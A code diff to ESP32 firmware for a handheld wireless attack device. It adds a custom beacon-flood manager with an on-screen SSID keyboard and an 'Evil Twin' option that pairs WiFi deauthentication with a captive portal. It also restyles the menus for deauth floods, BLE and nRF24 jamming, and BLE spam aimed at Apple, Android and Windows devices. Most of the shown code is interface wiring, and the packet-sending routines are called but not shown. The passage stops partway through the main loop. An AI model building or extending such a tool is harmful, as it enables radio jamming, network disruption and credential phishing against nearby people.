@@ -12,6 +12,8 @@
 #include <BLEAdvertisedDevice.h>
 #include <BLEAdvertising.h>
 #include <RF24.h>
+#include <FS.h>
+#include <SPIFFS.h>
 
 // TFT Display
 TFT_eSPI tft = TFT_eSPI();
@@ -43,8 +45,8 @@ bool portalActive = false;
 int scanResults = 0;
 
 // BLE Scanner
-BLEScan* pBLEScan;
-BLEAdvertising* pAdvertising;
+BLEScan* pBLEScan = nullptr;
+BLEAdvertising* pAdvertising = nullptr;
 int bleScanTime = 5;
 
 // Console buffer
@@ -89,6 +91,12 @@ unsigned long lastNRFJamTime = 0;
 bool nrf1Available = false;
 bool nrf2Available = false;
 
+// Beacon Flood variables
+String customBeacons[20] = {};  // Store up to 20 custom SSIDs
+int customBeaconCount = 0;
+int beaconDisplayOffset = 0;
+const int MAX_DISPLAY_BEACONS = 5;
+
 // Animation variables (ADD THESE)
 float skullX = 120;     // Center of 240 width
 float skullY = 160;     // Center of 320 height
@@ -131,6 +139,8 @@ enum MenuState {
   WIFI_MENU,
   WIFI_SCAN,
   WIFI_ATTACK_MENU,
+  BEACON_MANAGER,
+  BEACON_ADD,          
   BLE_MENU,
   BLE_SCAN_RESULTS,
   BLE_JAM_MENU,
@@ -369,6 +379,10 @@ void detectSkimmer(String name, int rssi) {
 void setup() {
   Serial.begin(115200);
   
+  // FIX: Add watchdog timer
+  esp_task_wdt_init(30, true);  // 30 second timeout
+  esp_task_wdt_add(NULL);
+  
   // Initialize TFT
   tft.init();
   tft.setRotation(0);
@@ -376,11 +390,12 @@ void setup() {
   pinMode(TFT_BL, OUTPUT);
   digitalWrite(TFT_BL, HIGH);
   
-  // PROPER Touch Calibration - CRITICAL for accuracy
-  // Run TFT_eSPI calibration sketch first to get YOUR screen's values
-  // These are generic values - REPLACE with your actual calibration data
-  uint16_t calData[5] = {275, 3620, 320, 3590, 4}; // [minX, maxX, minY, maxY, rotation]
+  // FIX: Touch Calibration - REPLACE THESE VALUES WITH YOUR SCREEN'S CALIBRATION
+  // Run TFT_eSPI > Examples > Generic > Touch_calibrate to get correct values
+  uint16_t calData[5] = {275, 3620, 320, 3590, 4}; // ⚠️ MUST CALIBRATE!
   tft.setTouch(calData);
+  
+  Serial.println("⚠️  WARNING: Touch not calibrated! Run calibration sketch first.");
   
   // Initialize WiFi in Station mode
   WiFi.mode(WIFI_STA);
@@ -407,12 +422,11 @@ void setup() {
     SPIFFS.begin(true);
   }
   
-  // Check if GIF exists
   if (!SPIFFS.exists("/boot.gif")) {
     Serial.println("boot.gif not found. Type 'upload' to upload via serial");
   }
   
-  // Initialize Radio 1
+  // FIX: Initialize Radio 1 with proper error handling
   if (radio1.begin(&hspi)) {
     radio1.setAutoAck(false);
     radio1.setPALevel(RF24_PA_MAX);
@@ -425,7 +439,10 @@ void setup() {
     addToConsole("nRF24#1 init failed!");
   }
   
-  // Initialize Radio 2
+  // FIX: Add delay between radio initializations to prevent SPI conflicts
+  delay(100);
+  
+  // FIX: Initialize Radio 2 with proper error handling
   if (radio2.begin(&hspi)) {
     radio2.setAutoAck(false);
     radio2.setPALevel(RF24_PA_MAX);
@@ -456,7 +473,17 @@ void setup() {
   drawMainMenu();
 }
 
-// Add this color definition at the top with your other colors
+#define COLOR_BG        0x0000  // Pure Black
+#define COLOR_HEADER    0x0208  // Very dark blue-grey
+#define COLOR_TEXT      0xCE79  // Light grey text
+#define COLOR_SELECTED  0x07E0  // Matrix green (selected items)
+#define COLOR_ITEM_BG   0x0208  // Very dark blue-grey (same as header)
+#define COLOR_BORDER    0x0320  // Dark green border
+#define COLOR_WARNING   0xFD20  // Orange
+#define COLOR_SUCCESS   0x07E0  // Matrix green
+#define COLOR_CRITICAL  0xC800  // Dark red
+#define COLOR_ACCENT    0x07E0  // Matrix green (was Kali blue)
+#define COLOR_PURPLE    0x8012  // Dark purple
 #define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
 #define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
 #define COLOR_LIME          0x87F0  // Lime green accent
@@ -805,18 +832,21 @@ void addToConsole(String message) {
 
 // Improved header with better styling
 void drawHeader(const char* title) {
-  // Dark header bar
+  // Dark header with green accent
   tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
-  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
+  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_MATRIX_GREEN);
   
-  // Title text
+  // Console-style prompt
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.setTextSize(1);
+  tft.setCursor(5, 8);
+  tft.print("root@p4wn:~# ");
+  
+  // Title
   tft.setTextColor(COLOR_TEXT);
   tft.setTextSize(2);
-  tft.setCursor(10, 10);
+  tft.setCursor(5, 18);
   tft.println(title);
-  
-  // Small indicator on right
-  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, COLOR_SUCCESS);
 }
 
 // Improved button drawing with better touch zones
@@ -826,50 +856,93 @@ void drawButton(const char* text, int index, int y, bool selected = false) {
   int h = BUTTON_HEIGHT;
   
   if (selected || index == selectedIndex) {
-    // Selected state
-    tft.fillRect(x, y, w, h, COLOR_ACCENT);
-    tft.drawRect(x, y, w, h, COLOR_TEXT);
-    tft.setTextColor(COLOR_BG);
+    // Selected state - Matrix green glow
+    tft.fillRect(x, y, w, h, COLOR_HEADER);
+    tft.drawRect(x, y, w, h, COLOR_MATRIX_GREEN);
+    tft.drawRect(x+1, y+1, w-2, h-2, COLOR_MATRIX_GREEN);
+    tft.setTextColor(COLOR_MATRIX_GREEN);
   } else {
-    // Normal state
-    tft.fillRect(x, y, w, h, COLOR_ITEM_BG);
-    tft.drawRect(x, y, w, h, COLOR_BORDER);
+    // Normal state - dark with green border
+    tft.fillRect(x, y, w, h, COLOR_HEADER);
+    tft.drawRect(x, y, w, h, COLOR_DARK_GREEN);
     tft.setTextColor(COLOR_TEXT);
   }
   
-  // Center text vertically
+  // Prefix with bracket (terminal style)
   tft.setTextSize(2);
   int textX = x + 10;
   int textY = y + (h - 16) / 2;
   tft.setCursor(textX, textY);
-  tft.println(text);
+  tft.print("[");
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.print("*");
+  tft.setTextColor(selected || index == selectedIndex ? COLOR_MATRIX_GREEN : COLOR_TEXT);
+  tft.print("] ");
+  tft.print(text);
 }
 
 void drawBackButton() {
   int y = SCREEN_HEIGHT - BUTTON_HEIGHT - 10;
-  tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_CRITICAL);
-  tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_WARNING);
-  tft.setTextColor(COLOR_TEXT);
+  tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_HEADER);
+  tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_CRITICAL);
+  tft.drawRect(SIDE_MARGIN+1, y+1, BUTTON_WIDTH-2, BUTTON_HEIGHT-2, COLOR_CRITICAL);
+  
+  tft.setTextColor(COLOR_CRITICAL);
   tft.setTextSize(2);
-  int textX = (SCREEN_WIDTH - 60) / 2;
+  int textX = (SCREEN_WIDTH - 100) / 2;
   tft.setCursor(textX, y + 14);
-  tft.println("< BACK");
+  tft.print("[");
+  tft.setTextColor(COLOR_WARNING);
+  tft.print("X");
+  tft.setTextColor(COLOR_CRITICAL);
+  tft.print("] BACK");
+}
+
+void drawStatusLine(int y, const char* label, const char* value, uint16_t valueColor) {
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN + 5, y);
+  tft.print("[");
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.print("*");
+  tft.setTextColor(COLOR_TEXT);
+  tft.print("] ");
+  tft.print(label);
+  tft.print(": ");
+  tft.setTextColor(valueColor);
+  tft.println(value);
 }
 
 void showMessage(const char* msg, uint16_t color) {
   int boxW = 200;
-  int boxH = 60;
+  int boxH = 80;
   int boxX = (SCREEN_WIDTH - boxW) / 2;
   int boxY = (SCREEN_HEIGHT - boxH) / 2;
   
-  tft.fillRect(boxX, boxY, boxW, boxH, COLOR_HEADER);
-  tft.drawRect(boxX, boxY, boxW, boxH, color);
-  tft.drawRect(boxX+1, boxY+1, boxW-2, boxH-2, color);
+  // Kali-style terminal message box
+  tft.fillRect(boxX, boxY, boxW, boxH, COLOR_BG);
+  tft.drawRect(boxX, boxY, boxW, boxH, COLOR_MATRIX_GREEN);
+  tft.drawRect(boxX+1, boxY+1, boxW-2, boxH-2, COLOR_DARK_GREEN);
   
+  // Header line
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.setCursor(boxX + 5, boxY + 5);
+  tft.println("root@p4wn:~#");
+  
+  tft.drawLine(boxX + 3, boxY + 18, boxX + boxW - 3, boxY + 18, COLOR_DARK_GREEN);
+  
+  // Message
   tft.setTextSize(1);
   tft.setTextColor(color);
-  tft.setCursor(boxX + 10, boxY + 25);
+  tft.setCursor(boxX + 10, boxY + 30);
+  tft.print("[");
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.print(color == COLOR_SUCCESS ? "+" : color == COLOR_WARNING ? "!" : "*");
+  tft.setTextColor(color);
+  tft.print("] ");
   tft.println(msg);
+  
   delay(2000);
 }
 
@@ -897,13 +970,160 @@ void drawWiFiMenu() {
   int y = HEADER_HEIGHT + 10;
   drawButton("Scan Networks", 0, y);
   y += BUTTON_HEIGHT + BUTTON_SPACING;
-  drawButton("Deauth Attack", 1, y);
+  drawButton("Select Target", 1, y);
   y += BUTTON_HEIGHT + BUTTON_SPACING;
-  drawButton("Beacon Flood", 2, y);
+  drawButton("Beacon Manager", 2, y);
   y += BUTTON_HEIGHT + BUTTON_SPACING;
-  drawButton("Captive Portal", 3, y);
+  drawButton("Deauth Flood", 3, y);
   
   drawBackButton();
+}
+
+void drawBeaconManager() {
+  tft.fillScreen(COLOR_BG);
+  drawHeader("BEACON MANAGER");
+  
+  int y = HEADER_HEIGHT + 10;
+  drawButton("Add Beacon", 0, y);
+  y += BUTTON_HEIGHT + BUTTON_SPACING;
+  drawButton(beaconFloodActive ? "Stop Flood" : "Start Flood", 1, y);
+  
+  // Status
+  y += BUTTON_HEIGHT + 20;
+  drawStatusLine(y, "Status", beaconFloodActive ? "FLOODING" : "STOPPED", 
+                 beaconFloodActive ? COLOR_WARNING : COLOR_SUCCESS);
+  y += 15;
+  char countStr[10];
+  sprintf(countStr, "%d", customBeaconCount);
+  drawStatusLine(y, "Custom APs", countStr, COLOR_MATRIX_GREEN);
+  
+  // List of custom beacons
+  y += 25;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_ACCENT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Custom Beacon List:");
+  y += 15;
+  
+  if (customBeaconCount == 0) {
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(SIDE_MARGIN + 5, y);
+    tft.println("No custom beacons yet");
+  } else {
+    int displayCount = min(customBeaconCount - beaconDisplayOffset, MAX_DISPLAY_BEACONS);
+    
+    for (int i = 0; i < displayCount; i++) {
+      int idx = beaconDisplayOffset + i;
+      
+      // Beacon item with delete button
+      tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH - 40, 20, COLOR_ITEM_BG);
+      tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH - 40, 20, COLOR_BORDER);
+      
+      tft.setTextSize(1);
+      tft.setTextColor(COLOR_TEXT);
+      tft.setCursor(SIDE_MARGIN + 5, y + 6);
+      String truncated = customBeacons[idx];
+      if (truncated.length() > 20) truncated = truncated.substring(0, 20);
+      tft.print(truncated);
+      
+      // Delete button
+      int deleteX = SCREEN_WIDTH - SIDE_MARGIN - 35;
+      tft.fillRect(deleteX, y, 30, 20, COLOR_CRITICAL);
+      tft.drawRect(deleteX, y, 30, 20, COLOR_WARNING);
+      tft.setTextColor(COLOR_TEXT);
+      tft.setCursor(deleteX + 8, y + 6);
+      tft.print("DEL");
+      
+      y += 22;
+    }
+    
+    // Scroll indicator
+    if (customBeaconCount > MAX_DISPLAY_BEACONS) {
+      tft.setTextColor(COLOR_PURPLE);
+      tft.setCursor(SCREEN_WIDTH / 2 - 30, y + 3);
+      tft.printf("Page %d/%d", (beaconDisplayOffset / MAX_DISPLAY_BEACONS) + 1, 
+                 (customBeaconCount + MAX_DISPLAY_BEACONS - 1) / MAX_DISPLAY_BEACONS);
+    }
+  }
+  
+  drawBackButton();
+}
+
+String beaconInputSSID = "";
+
+void drawBeaconAddScreen() {
+  tft.fillScreen(COLOR_BG);
+  drawHeader("ADD BEACON");
+  
+  // Input display area
+  int inputY = HEADER_HEIGHT + 20;
+  tft.fillRect(SIDE_MARGIN, inputY, BUTTON_WIDTH, 30, COLOR_ITEM_BG);
+  tft.drawRect(SIDE_MARGIN, inputY, BUTTON_WIDTH, 30, COLOR_MATRIX_GREEN);
+  
+  tft.setTextSize(2);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN + 5, inputY + 8);
+  if (beaconInputSSID.length() > 0) {
+    String display = beaconInputSSID;
+    if (display.length() > 15) display = display.substring(0, 15);
+    tft.print(display);
+  } else {
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.print("Enter SSID...");
+  }
+  
+  // Simple on-screen keyboard
+  int keyY = inputY + 45;
+  const char* keyboard[4][10] = {
+    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
+    {"A", "S", "D", "F", "G", "H", "J", "K", "L", "_"},
+    {"Z", "X", "C", "V", "B", "N", "M", "-", ".", " "},
+    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
+  };
+  
+  int keyW = 22;
+  int keyH = 28;
+  int keySpacing = 2;
+  
+  for (int row = 0; row < 4; row++) {
+    for (int col = 0; col < 10; col++) {
+      int x = SIDE_MARGIN + (col * (keyW + keySpacing));
+      int y = keyY + (row * (keyH + keySpacing));
+      
+      tft.fillRect(x, y, keyW, keyH, COLOR_HEADER);
+      tft.drawRect(x, y, keyW, keyH, COLOR_DARK_GREEN);
+      
+      tft.setTextSize(1);
+      tft.setTextColor(COLOR_MATRIX_GREEN);
+      tft.setCursor(x + 7, y + 10);
+      tft.print(keyboard[row][col]);
+    }
+  }
+  
+  // Control buttons
+  int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
+  
+  // Backspace button
+  tft.fillRect(SIDE_MARGIN, controlY, 70, 25, COLOR_WARNING);
+  tft.drawRect(SIDE_MARGIN, controlY, 70, 25, COLOR_CRITICAL);
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_BG);
+  tft.setCursor(SIDE_MARGIN + 10, controlY + 9);
+  tft.print("BACKSPACE");
+  
+  // Save button
+  tft.fillRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_SUCCESS);
+  tft.drawRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_MATRIX_GREEN);
+  tft.setTextColor(COLOR_BG);
+  tft.setCursor(SIDE_MARGIN + 95, controlY + 9);
+  tft.print("SAVE");
+  
+  // Cancel button
+  tft.fillRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_CRITICAL);
+  tft.drawRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_WARNING);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN + 162, controlY + 9);
+  tft.print("CANCEL");
 }
 
 void drawBLEMenu() {
@@ -950,19 +1170,10 @@ void drawBLEJammerMenu() {
   drawButton("Stop Jammer", 1, y);
   
   y += BUTTON_HEIGHT + 20;
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Mode: ");
-  tft.setTextColor(COLOR_ACCENT);
-  tft.println(jammerModeText);
-  
+  drawStatusLine(y, "Mode", jammerModeText.c_str(), COLOR_MATRIX_GREEN);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Status: ");
-  tft.setTextColor(bleJammerActive ? COLOR_WARNING : COLOR_SUCCESS);
-  tft.println(bleJammerActive ? "ACTIVE" : "STOPPED");
+  drawStatusLine(y, "Status", bleJammerActive ? "ACTIVE" : "STOPPED", 
+                 bleJammerActive ? COLOR_WARNING : COLOR_SUCCESS);
   
   drawBackButton();
 }
@@ -975,26 +1186,16 @@ void drawSnifferMenu() {
   drawButton("Start Sniffer", 0, y);
   y += BUTTON_HEIGHT + BUTTON_SPACING;
   drawButton("Stop Sniffer", 1, y);
-  
+
   y += BUTTON_HEIGHT + 20;
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Channel: ");
-  tft.setTextColor(COLOR_ACCENT);
-  tft.print(snifferChannel);
-  
+  char channelStr[10];
+  sprintf(channelStr, "Ch %d", snifferChannel);
+  drawStatusLine(y, "Channel", channelStr, COLOR_MATRIX_GREEN);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Status: ");
-  tft.setTextColor(snifferActive ? COLOR_WARNING : COLOR_SUCCESS);
-  tft.println(snifferActive ? "ACTIVE" : "STOPPED");
-  
+  drawStatusLine(y, "Status", snifferActive ? "ACTIVE" : "STOPPED", 
+                 snifferActive ? COLOR_WARNING : COLOR_SUCCESS);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.printf("Packets: %d", packetCount);
+  drawStatusLine(y, "Packets", String(packetCount).c_str(), COLOR_MATRIX_GREEN);
   
   drawBackButton();
 }
@@ -1027,22 +1228,21 @@ void drawAttackMenu() {
   tft.println(displaySSID);
   
   int y = HEADER_HEIGHT + 35;
-  drawButton("Start Deauth", 0, y);
+  drawButton("Deauth Only", 0, y);
   y += BUTTON_HEIGHT + BUTTON_SPACING;
-  drawButton("Stop Attack", 1, y);
+  drawButton("Evil Twin", 1, y);
+  y += BUTTON_HEIGHT + BUTTON_SPACING;
+  drawButton("Stop Attack", 2, y);
   
+  // Status display with terminal style
   y += BUTTON_HEIGHT + 20;
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Status: ");
-  tft.setTextColor(deauthActive ? COLOR_WARNING : COLOR_SUCCESS);
-  tft.println(deauthActive ? "ATTACKING" : "STOPPED");
-  
+  drawStatusLine(y, "Deauth", deauthActive ? "ACTIVE" : "STOPPED", 
+                 deauthActive ? COLOR_WARNING : COLOR_SUCCESS);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.printf("Packets sent: %d", deauthPacketsSent);
+  drawStatusLine(y, "Portal", portalActive ? "ACTIVE" : "STOPPED", 
+                 portalActive ? COLOR_WARNING : COLOR_SUCCESS);
+  y += 15;
+  drawStatusLine(y, "Packets sent", String(deauthPacketsSent).c_str(), COLOR_MATRIX_GREEN);
   
   drawBackButton();
 }
@@ -1059,19 +1259,11 @@ void drawSpamMenu() {
   drawButton("Windows Spam", 2, y);
   
   y += BUTTON_HEIGHT + 20;
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Apple: ");
-  tft.setTextColor(appleSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
-  tft.println(appleSpamActive ? "ACTIVE" : "OFF");
-  
+  drawStatusLine(y, "Apple", appleSpamActive ? "ACTIVE" : "OFF", 
+                 appleSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Android: ");
-  tft.setTextColor(androidSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
-  tft.println(androidSpamActive ? "ACTIVE" : "OFF");
+  drawStatusLine(y, "Android", androidSpamActive ? "ACTIVE" : "OFF", 
+                 androidSpamActive ? COLOR_WARNING : COLOR_SUCCESS);
   
   drawBackButton();
 }
@@ -1088,27 +1280,14 @@ void drawNRFJammerMenu() {
   drawButton("Toggle Dual", 2, y);
   
   y += BUTTON_HEIGHT + 20;
-  tft.setTextSize(1);
-  
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Mode: ");
-  tft.setTextColor(dualNRFMode ? COLOR_ACCENT : COLOR_PURPLE);
-  tft.println(dualNRFMode ? "DUAL (2x)" : "SINGLE");
-  
+  drawStatusLine(y, "Mode", dualNRFMode ? "DUAL (2x)" : "SINGLE", 
+                 dualNRFMode ? COLOR_MATRIX_GREEN : COLOR_PURPLE);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Radio 1: ");
-  tft.setTextColor(nrf1Available ? COLOR_SUCCESS : COLOR_WARNING);
-  tft.println(nrf1Available ? "OK" : "FAIL");
-  
+  drawStatusLine(y, "Radio 1", nrf1Available ? "OK" : "FAIL", 
+                 nrf1Available ? COLOR_SUCCESS : COLOR_WARNING);
   y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Radio 2: ");
-  tft.setTextColor(nrf2Available ? COLOR_SUCCESS : COLOR_WARNING);
-  tft.println(nrf2Available ? "OK" : "FAIL");
+  drawStatusLine(y, "Radio 2", nrf2Available ? "OK" : "FAIL", 
+                 nrf2Available ? COLOR_SUCCESS : COLOR_WARNING);
   
   drawBackButton();
 }
@@ -1179,6 +1358,12 @@ void handleTouch() {
       case WIFI_MENU:
         handleWiFiMenuTouch(touchX, touchY);
         break;
+      case BEACON_MANAGER:
+        handleBeaconManagerTouch(touchX, touchY);
+        break;
+      case BEACON_ADD:
+        handleBeaconAddTouch(touchX, touchY);
+        break;
       case WIFI_SCAN:
         handleWiFiScanTouch(touchX, touchY);
         break;
@@ -1231,14 +1416,20 @@ void handleTouch() {
 }
 
 void handleBackButton() {
+  // FIX: Stop continuous scans properly
   if (continuousWiFiScan) {
     continuousWiFiScan = false;
     WiFi.scanDelete();
   }
+  
   if (continuousBLEScan) {
     continuousBLEScan = false;
-    if (pBLEScan) pBLEScan->stop();
+    // FIX: Check if pBLEScan exists before stopping
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+    }
   }
+  
   if (currentState == BLE_JAM_ACTIVE) stopBLEJammer();
   if (currentState == SNIFFER_ACTIVE) stopSniffer();
   if (currentState == NRF_JAM_ACTIVE) stopNRFJammer();
@@ -1257,8 +1448,13 @@ void handleBackButton() {
       break;
     case WIFI_SCAN:
     case WIFI_ATTACK_MENU:
+    case BEACON_MANAGER:
       currentState = WIFI_MENU;
       drawWiFiMenu();
+      break;
+    case BEACON_ADD:
+      currentState = BEACON_MANAGER;
+      drawBeaconManager();
       break;
     case BLE_JAM_MENU:
     case SPAM_MENU:
@@ -1328,7 +1524,7 @@ void handleWiFiMenuTouch(int x, int y) {
     case 0: // Scan Networks
       scanWiFiNetworks();
       break;
-    case 1: // Deauth Attack
+    case 1: // Select Target
       if (networkCount > 0) {
         currentState = WIFI_ATTACK_MENU;
         drawAttackMenu();
@@ -1338,18 +1534,163 @@ void handleWiFiMenuTouch(int x, int y) {
         drawWiFiMenu();
       }
       break;
-    case 2: // Beacon Flood
-      startBeaconFlood();
+    case 2: // Beacon Manager
+      currentState = BEACON_MANAGER;
+      beaconDisplayOffset = 0;
+      drawBeaconManager();
       break;
-    case 3: // Captive Portal
+    case 3: // Deauth Flood
       if (networkCount > 0) {
-        startCaptivePortal();
+        startDeauthFlood();
       } else {
         showMessage("Scan networks first!", COLOR_WARNING);
         delay(500);
         drawWiFiMenu();
       }
       break;
+  }
+}
+
+void handleBeaconManagerTouch(int x, int y) {
+  int startY = HEADER_HEIGHT + 10;
+  int buttonIndex = getTouchedButtonIndex(y, startY);
+  
+  // Handle top buttons
+  if (buttonIndex == 0) {
+    // Add Beacon
+    currentState = BEACON_ADD;
+    beaconInputSSID = "";  // Clear input when entering
+    drawBeaconAddScreen();
+    return;
+  } else if (buttonIndex == 1) {
+    // Start/Stop Flood
+    if (customBeaconCount == 0) {
+      showMessage("Add beacons first!", COLOR_WARNING);
+      delay(1000);
+      drawBeaconManager();
+      return;
+    }
+    beaconFloodActive = !beaconFloodActive;
+    if (beaconFloodActive) {
+      addToConsole("Custom beacon flood started");
+      showMessage("Flooding custom APs!", COLOR_WARNING);
+    } else {
+      addToConsole("Beacon flood stopped");
+      showMessage("Beacon flood stopped", COLOR_SUCCESS);
+      // Reset WiFi state
+      esp_wifi_stop();
+      delay(100);
+      WiFi.mode(WIFI_STA);
+    }
+    delay(1000);
+    drawBeaconManager();
+    return;
+  }
+  
+  // Handle delete buttons in list
+  int listStartY = HEADER_HEIGHT + 10 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 55;
+  int deleteX = SCREEN_WIDTH - SIDE_MARGIN - 35;
+  
+  if (x >= deleteX && x <= deleteX + 30) {
+    int itemIndex = (y - listStartY) / 22;
+    if (itemIndex >= 0 && itemIndex < MAX_DISPLAY_BEACONS) {
+      int actualIndex = beaconDisplayOffset + itemIndex;
+      if (actualIndex < customBeaconCount) {
+        deleteBeacon(actualIndex);
+        drawBeaconManager();
+      }
+    }
+  }
+  
+  // Handle scroll
+  int scrollY = listStartY + (MAX_DISPLAY_BEACONS * 22) + 3;
+  if (y >= scrollY && y <= scrollY + 15 && customBeaconCount > MAX_DISPLAY_BEACONS) {
+    beaconDisplayOffset = (beaconDisplayOffset + MAX_DISPLAY_BEACONS) % customBeaconCount;
+    drawBeaconManager();
+  }
+}
+
+void handleBeaconAddTouch(int x, int y) {
+  int inputY = HEADER_HEIGHT + 20;
+  int keyY = inputY + 45;
+  int keyW = 22;
+  int keyH = 28;
+  int keySpacing = 2;
+  
+  const char* keyboard[4][10] = {
+    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
+    {"A", "S", "D", "F", "G", "H", "J", "K", "L", "_"},
+    {"Z", "X", "C", "V", "B", "N", "M", "-", ".", " "},
+    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
+  };
+  
+  // Check keyboard
+  for (int row = 0; row < 4; row++) {
+    for (int col = 0; col < 10; col++) {
+      int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
+      int keyYPos = keyY + (row * (keyH + keySpacing));
+      
+      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
+        if (beaconInputSSID.length() < 32) {
+          beaconInputSSID += keyboard[row][col];
+          drawBeaconAddScreen();
+        }
+        return;
+      }
+    }
+  }
+  
+  // Check control buttons
+  int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
+  
+  // Backspace
+  if (x >= SIDE_MARGIN && x <= SIDE_MARGIN + 70 && y >= controlY && y <= controlY + 25) {
+    if (beaconInputSSID.length() > 0) {
+      beaconInputSSID.remove(beaconInputSSID.length() - 1);
+      drawBeaconAddScreen();
+    }
+    return;
+  }
+  
+  // Save
+  if (x >= SIDE_MARGIN + 75 && x <= SIDE_MARGIN + 145 && y >= controlY && y <= controlY + 25) {
+    if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
+      customBeacons[customBeaconCount] = beaconInputSSID;
+      customBeaconCount++;
+      addToConsole("Added: " + beaconInputSSID);
+      beaconInputSSID = "";  // Clear input
+      currentState = BEACON_MANAGER;
+      showMessage("Beacon added!", COLOR_SUCCESS);
+      delay(1000);
+      drawBeaconManager();
+    }
+    return;
+  }
+  
+  // Cancel
+  if (x >= SIDE_MARGIN + 150 && x <= SIDE_MARGIN + 220 && y >= controlY && y <= controlY + 25) {
+    beaconInputSSID = "";  // Clear input
+    currentState = BEACON_MANAGER;
+    drawBeaconManager();
+    return;
+  }
+}
+
+void deleteBeacon(int index) {
+  if (index < 0 || index >= customBeaconCount) return;
+  
+  addToConsole("Deleted: " + customBeacons[index]);
+  
+  // Shift array
+  for (int i = index; i < customBeaconCount - 1; i++) {
+    customBeacons[i] = customBeacons[i + 1];
+  }
+  customBeaconCount--;
+  
+  // Adjust scroll if needed
+  if (beaconDisplayOffset >= customBeaconCount && beaconDisplayOffset > 0) {
+    beaconDisplayOffset -= MAX_DISPLAY_BEACONS;
+    if (beaconDisplayOffset < 0) beaconDisplayOffset = 0;
   }
 }
 
@@ -1590,21 +1931,40 @@ void handleAttackMenuTouch(int x, int y) {
   int startY = HEADER_HEIGHT + 35;
   int buttonIndex = getTouchedButtonIndex(y, startY);
   
-  if (buttonIndex < 0 || buttonIndex > 1) return;
+  if (buttonIndex < 0 || buttonIndex > 2) return;
   
   switch (buttonIndex) {
-    case 0: // Start Deauth
+    case 0: // Deauth Only
+      if (portalActive) stopCaptivePortal();
       startDeauth();
       drawAttackMenu();
       break;
-    case 1: // Stop Attack
+    case 1: // Evil Twin (Deauth + Captive Portal)
+      startEvilTwin();
+      drawAttackMenu();
+      break;
+    case 2: // Stop Attack
       stopDeauth();
+      if (portalActive) stopCaptivePortal();
       drawAttackMenu();
       break;
   }
 }
 
 void loop() {
+  // FIX: Reset watchdog
+  esp_task_wdt_reset();
+  
+  // FIX: Heap monitoring
+  static unsigned long lastHeapCheck = 0;
